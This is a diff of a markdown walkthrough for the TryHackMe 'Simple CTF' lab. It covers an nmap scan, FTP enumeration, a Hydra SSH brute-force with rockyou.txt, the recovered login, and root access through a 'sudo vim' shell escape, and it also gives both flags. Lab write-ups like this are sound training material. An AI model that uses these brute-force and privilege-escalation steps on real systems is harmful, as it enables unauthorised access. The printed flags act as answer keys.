@@ -1,15 +1,16 @@
 # Simple CTF
 
-IP: 10.10.121.109
+```bash
+export IP=10.10.121.109
+```
 
 ## Scans
 
 ### Nmap
 
-Initial Nmap Scan
-
+Initial Nmap Scan:
 ```bash
-nmap -sC -sv -oN scans/nmap.initial 10.10.121.109
+nmap -sC -sv -oN scans/nmap.initial $IP
 ```
 
 Open Ports Found:
@@ -35,10 +36,10 @@ Directories found:
 
 found name `mike` in robots.txt
 
+
 ## FTP
 
 looking around in FTP:
-
 ```
 ftp> nlist
 200 PORT command successful. Consider using PASV.
@@ -67,33 +68,30 @@ found name `mitch` in `ForMitch.txt`
 
 ## Hydra
 
-Bruteforcing username `mitch` with rockyou pwlist on ssh port 2222
+Bruteforcing username `mitch` with `rockyou.txt` passwordlist on SSH port 2222
 
 ```bash
 hydra -l mitch -P wordlists/rockyou.txt ssh://10.10.121.109:2222
 ```
 
-found credentials:
-```
-mitch:secret
-```
+found credentials: `mitch:secret`
+
 
 ## SSH into Machine
 ```bash
 ssh mitch@10.10.121.109 -p 2222
 ```
 
-User Flag found
 ```bash
 ls
 cat user.txt
-
-G00d j0b, keep up!
 ```
 
-new user found `sunbath`
+**User Flag Found**: `G00d j0b, keep up!`
 
-privesc by:
+new user `sunbath` found in `/home/`
+
+PrivEsc by:
 ```bash
 sudo -l
 ```
@@ -104,14 +102,14 @@ and searching vim on [gtfoBins](https://gtfobins.github.io/gtfobins/vim/)
 sudo vim -c ':!/bin/sh'
 ```
 
-Root access and Root flag found
 ```
 whoami
 cd /root/
 cat root.txt
-
-W3ll d0n3. You made it!
 ```
+
+**Root flag found**: `W3ll d0n3. You made it!`
+
 
 ----
 [back to TryHackMe main page](thm.md)
